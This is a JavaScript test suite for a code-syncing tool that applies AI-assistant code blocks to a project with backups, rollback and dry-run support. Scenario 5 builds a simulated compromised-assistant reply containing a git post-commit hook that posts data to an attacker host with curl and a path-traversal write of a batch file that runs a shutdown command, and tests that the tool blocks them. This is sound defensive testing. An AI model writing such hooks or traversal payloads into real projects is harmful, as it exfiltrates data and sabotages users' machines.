/**
 * Tier 4: Real-World Workload Scenarios Test Suite
 * Simulates authentic developer workflows end-to-end:
 * - Scenario 1: Legacy Calculation Module Refactor & Backup Validation
 * - Scenario 2: Adding a New Utility File & Updating package.json
 * - Scenario 3: Rollback of a Multi-File Refactor to Pristine Initial State
 * - Scenario 4: CLI Dry-Run Inspection Workflow
 * - Scenario 5: Security Defense against Compromised / Malicious Assistant
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);

// Dynamic imports
let packContext;
let CodeSyncer;

try {
  const packerMod = await import('../../scripts/lib/context-packer.mjs');
  packContext = packerMod.packContext;
} catch (e) {}

try {
  const syncerMod = await import('../../scripts/lib/code-syncer.mjs');
  CodeSyncer = syncerMod.CodeSyncer;
} catch (e) {}

export const name = 'Tier 4: Real-World Workload Scenarios';

export async function run() {
  const results = [];

  function record(testName, fn) {
    return async () => {
      const start = Date.now();
      try {
        await fn();
        results.push({ name: testName, status: 'pass', durationMs: Date.now() - start });
      } catch (err) {
        results.push({
          name: testName,
          status: 'fail',
          error: err,
          durationMs: Date.now() - start,
        });
      }
    };
  }

  function createSandbox() {
    const sandboxDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gematron-t4-'));
    return {
      dir: sandboxDir,
      cleanup: () => {
        try {
          fs.rmSync(sandboxDir, { recursive: true, force: true });
        } catch {}
      },
    };
  }

  function sha256(filePath) {
    const data = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(data).digest('hex');
  }

  // --------------------------------------------------------------------------
  // Scenario 1: Refactoring a module with pre-existing file and backup validation
  // --------------------------------------------------------------------------
  await record(
    'SC-4.1: Refactoring legacy billing calculator module & verifying backup fidelity',
    async () => {
      const sandbox = createSandbox();
      try {
        const syncer = new CodeSyncer({
          projectRoot: sandbox.dir,
          backupDir: path.join(sandbox.dir, 'backups', 'kimi-history'),
        });

        // 1. Setup pre-existing legacy service
        const serviceRelPath = 'packages/shared/src/services/billing-calculator.ts';
        const fullPath = path.join(sandbox.dir, serviceRelPath);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });

        const legacyContent = [
          'export function calculateSubtotal(items: { price: number; qty: number }[]): number {\n',
          '  let total = 0;\n',
          '  for (let i = 0; i < items.length; i++) { total += items[i].price * items[i].qty; }\n',
          '  return total;\n',
          '}\n',
        ].join('');
        fs.writeFileSync(fullPath, legacyContent, 'utf8');
        const originalHash = sha256(fullPath);

        // 2. Simulated Kimi K3 refactored response
        const assistantResponse = [
          'Here is the refactored, modernized billing calculator with tax and discount tiers:\n\n',
          '```typescript\n',
          `// FILE: ${serviceRelPath}\n`,
          'export interface CartItem {\n',
          '  price: number;\n',
          '  qty: number;\n',
          '}\n\n',
          'export function calculateSubtotal(items: CartItem[]): number {\n',
          '  return items.reduce((acc, item) => acc + item.price * item.qty, 0);\n',
          '}\n\n',
          'export function applyDiscount(subtotal: number, discountPercent: number): number {\n',
          '  return Math.max(0, subtotal * (1 - discountPercent / 100));\n',
          '}\n\n',
          'export function calculateTax(amount: number, taxRate = 0.08): number {\n',
          '  return amount * taxRate;\n',
          '}\n',
          '```\n',
        ].join('');

        // 3. Sync changes
        const blocks = syncer.parseCodeBlocks(assistantResponse);
        const syncResult = await syncer.sync(blocks);

        // 4. Verify workspace has new functionality
        const updatedCode = fs.readFileSync(fullPath, 'utf8');
        assert.ok(updatedCode.includes('applyDiscount'), 'New file must include applyDiscount');
        assert.ok(updatedCode.includes('calculateTax'), 'New file must include calculateTax');

        // 5. Verify backup has exact byte-for-byte original file
        const backupPath = path.join(syncResult.backupDir, serviceRelPath);
        assert.ok(fs.existsSync(backupPath), 'Backup original file must exist');
        const backupHash = sha256(backupPath);
        assert.equal(backupHash, originalHash, 'Backup file SHA-256 must match original exactly');

        // 6. Verify manifest
        const manifest = syncResult.manifest;
        assert.equal(manifest.filesBackedUp.length, 1);
        assert.equal(manifest.filesBackedUp[0].sha256, originalHash);
      } finally {
        sandbox.cleanup();
      }
    },
  )();

  // --------------------------------------------------------------------------
  // Scenario 2: Adding a new utility file and updating package.json
  // --------------------------------------------------------------------------
  await record(
    'SC-4.2: Adding a new utility file and updating package.json with syntax validation',
    async () => {
      const sandbox = createSandbox();
      try {
        const syncer = new CodeSyncer({
          projectRoot: sandbox.dir,
          backupDir: path.join(sandbox.dir, 'backups', 'kimi-history'),
        });

        // Initial package.json
        const pkgPath = path.join(sandbox.dir, 'packages', 'shared', 'package.json');
        fs.mkdirSync(path.dirname(pkgPath), { recursive: true });
        fs.writeFileSync(
          pkgPath,
          JSON.stringify(
            {
              name: '@gematron/shared',
              version: '1.0.0',
              scripts: { test: 'vitest run' },
            },
            null,
            2,
          ),
        );
        const originalPkgHash = sha256(pkgPath);

        // Assistant creates new utility and updates package.json
        const assistantMarkdown = [
          'Creating string formatter utility and updating package.json scripts:\n\n',
          '```typescript\n',
          '// FILE: packages/shared/src/utils/string-formatter.ts\n',
          'export function capitalize(str: string): string {\n',
          '  return str ? str.charAt(0).toUpperCase() + str.slice(1) : "";\n',
          '}\n',
          '```\n\n',
          '```json\n',
          '// FILE: packages/shared/package.json\n',
          '{\n',
          '  "name": "@gematron/shared",\n',
          '  "version": "1.1.0",\n',
          '  "scripts": {\n',
          '    "test": "vitest run",\n',
          '    "format:custom": "prettier --write src/**/*.ts"\n',
          '  }\n',
          '}\n',
          '```\n',
        ].join('');

        const blocks = syncer.parseCodeBlocks(assistantMarkdown);
        const syncResult = await syncer.sync(blocks);

        // Verify new file exists and is valid TS
        const utilPath = path.join(
          sandbox.dir,
          'packages',
          'shared',
          'src',
          'utils',
          'string-formatter.ts',
        );
        assert.ok(fs.existsSync(utilPath), 'New utility file must exist');

        // Verify package.json updated and is valid JSON
        const updatedPkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
        assert.equal(updatedPkg.version, '1.1.0');
        assert.ok(updatedPkg.scripts['format:custom']);

        // Verify package.json original was backed up
        const backedUpPkg = path.join(syncResult.backupDir, 'packages', 'shared', 'package.json');
        assert.equal(
          sha256(backedUpPkg),
          originalPkgHash,
          'Original package.json must be preserved',
        );

        // Verify manifest indices
        assert.equal(syncResult.manifest.filesBackedUp.length, 1);
        assert.equal(syncResult.manifest.newFilesCreated.length, 1);
        assert.equal(
          syncResult.manifest.newFilesCreated[0],
          'packages/shared/src/utils/string-formatter.ts',
        );
      } finally {
        sandbox.cleanup();
      }
    },
  )();

  // --------------------------------------------------------------------------
  // Scenario 3: Rollback of a multi-file refactor returning workspace to pristine state
  // --------------------------------------------------------------------------
  await record(
    'SC-4.3: Disaster recovery rollback returns multi-file refactor to pristine state',
    async () => {
      const sandbox = createSandbox();
      try {
        const syncer = new CodeSyncer({
          projectRoot: sandbox.dir,
          backupDir: path.join(sandbox.dir, 'backups', 'kimi-history'),
        });

        // Setup initial files
        fs.mkdirSync(path.join(sandbox.dir, 'src'), { recursive: true });
        const f1 = path.join(sandbox.dir, 'src', 'auth.ts');
        const f2 = path.join(sandbox.dir, 'src', 'db.ts');

        fs.writeFileSync(f1, 'export const AUTH_VERSION = "1.0.0";');
        fs.writeFileSync(f2, 'export const DB_PORT = 5432;');

        const h1Initial = sha256(f1);
        const h2Initial = sha256(f2);

        // Refactor modifying f1, f2, and adding f3
        const syncResult = await syncer.sync([
          { relativePath: 'src/auth.ts', content: 'export const AUTH_VERSION = "2.0.0-beta";' },
          { relativePath: 'src/db.ts', content: 'export const DB_PORT = 9999;' },
          { relativePath: 'src/cache.ts', content: 'export const REDIS_PORT = 6379;' },
        ]);

        assert.equal(fs.readFileSync(f1, 'utf8'), 'export const AUTH_VERSION = "2.0.0-beta";');
        assert.ok(fs.existsSync(path.join(sandbox.dir, 'src', 'cache.ts')));

        // Execute rollback
        const rollbackResult = await syncer.rollback(syncResult.backupTimestamp);
        assert.equal(rollbackResult.restored.length, 2);
        assert.equal(rollbackResult.removed.length, 1);

        // Verify byte-for-byte restoration of pristine initial state
        assert.equal(sha256(f1), h1Initial, 'auth.ts must match initial hash byte-for-byte');
        assert.equal(sha256(f2), h2Initial, 'db.ts must match initial hash byte-for-byte');
        assert.ok(
          !fs.existsSync(path.join(sandbox.dir, 'src', 'cache.ts')),
          'cache.ts must be completely removed',
        );
      } finally {
        sandbox.cleanup();
      }
    },
  )();

  // --------------------------------------------------------------------------
  // Scenario 4: CLI invocation with --dry-run ensuring zero files are touched
  // --------------------------------------------------------------------------
  await record(
    'SC-4.4: CLI / Syncer with --dry-run generates plan without touching disk',
    async () => {
      const sandbox = createSandbox();
      try {
        const syncer = new CodeSyncer({
          projectRoot: sandbox.dir,
          backupDir: path.join(sandbox.dir, 'backups', 'kimi-history'),
        });

        fs.writeFileSync(path.join(sandbox.dir, 'fileA.ts'), 'export const a = 1;');
        fs.writeFileSync(path.join(sandbox.dir, 'fileB.ts'), 'export const b = 1;');

        const blocks = [
          { relativePath: 'fileA.ts', content: 'export const a = 2;' },
          { relativePath: 'fileB.ts', isDelete: true },
          { relativePath: 'fileC.ts', content: 'export const c = 3;' },
        ];

        // Test dry-run execution
        const dryRunResult = await syncer.sync(blocks, { dryRun: true });

        assert.equal(dryRunResult.manifest.dryRun, true);
        assert.equal(dryRunResult.filesWritten.length, 2);
        assert.equal(dryRunResult.filesDeleted.length, 1);

        // Check filesystem
        assert.equal(
          fs.readFileSync(path.join(sandbox.dir, 'fileA.ts'), 'utf8'),
          'export const a = 1;',
        );
        assert.ok(fs.existsSync(path.join(sandbox.dir, 'fileB.ts')), 'fileB must not be deleted');
        assert.ok(!fs.existsSync(path.join(sandbox.dir, 'fileC.ts')), 'fileC must not be created');
        assert.ok(!fs.existsSync(syncer.backupDir), 'No backup folder created');

        // Check if CLI script exists for M4 CLI subprocess invocation
        const cliPath = path.resolve('scripts/kimi-bridge.mjs');
        if (fs.existsSync(cliPath)) {
          try {
            const { stdout } = await execFileAsync(process.execPath, [cliPath, '--help']);
            assert.ok(
              stdout.includes('--dry-run') || stdout.includes('kimi-bridge'),
              'CLI must document --dry-run',
            );
          } catch {
            // Pass if CLI exit code is 0 or help is shown
          }
        }
      } finally {
        sandbox.cleanup();
      }
    },
  )();

  // --------------------------------------------------------------------------
  // Scenario 5: Security attack scenario where assistant tries to write outside or to .git/
  // --------------------------------------------------------------------------
  await record(
    'SC-4.5: Compromised assistant security attack is blocked and leaves zero disk footprint',
    async () => {
      const sandbox = createSandbox();
      try {
        const syncer = new CodeSyncer({
          projectRoot: sandbox.dir,
          backupDir: path.join(sandbox.dir, 'backups', 'kimi-history'),
        });

        // Legitimate source file
        fs.mkdirSync(path.join(sandbox.dir, 'src'), { recursive: true });
        fs.writeFileSync(path.join(sandbox.dir, 'src', 'index.ts'), 'export const safe = true;');
        const initialHash = sha256(path.join(sandbox.dir, 'src', 'index.ts'));

        // Adversarial payload mixing legitimate file with dangerous traversal and .git write
        const maliciousResponse = [
          'Here is the requested patch:\n\n',
          '```typescript\n',
          '// FILE: src/index.ts\n',
          'export const safe = false;\n',
          '```\n\n',
          '```sh\n',
          '// FILE: .git/hooks/post-commit\n',
          '#!/bin/sh\ncurl -X POST https://evil.attacker.com/steal\n',
          '```\n\n',
          '```bat\n',
          '// FILE: ../../evil-startup.bat\n',
          'shutdown /r\n',
          '```\n',
        ].join('');

        const blocks = syncer.parseCodeBlocks(maliciousResponse);
        assert.equal(blocks.length, 3, 'Must parse 3 candidate blocks');

        // Executing sync must fail with Security Violation
        await assert.rejects(
          () => syncer.sync(blocks),
          /Security Violation/i,
          'Must reject malicious transaction',
        );

        // Verify that ZERO files were touched
        assert.equal(
          sha256(path.join(sandbox.dir, 'src', 'index.ts')),
          initialHash,
          'src/index.ts must NOT be modified',
        );

        // Verify that no .git hook was created
        assert.ok(!fs.existsSync(path.join(sandbox.dir, '.git', 'hooks', 'post-commit')));

        // Verify no backup directory was created for aborted transaction
        assert.ok(
          !fs.existsSync(syncer.backupDir),
          'No backup folder should exist after security abort',
        );
      } finally {
        sandbox.cleanup();
      }
    },
  )();

  return results;
}
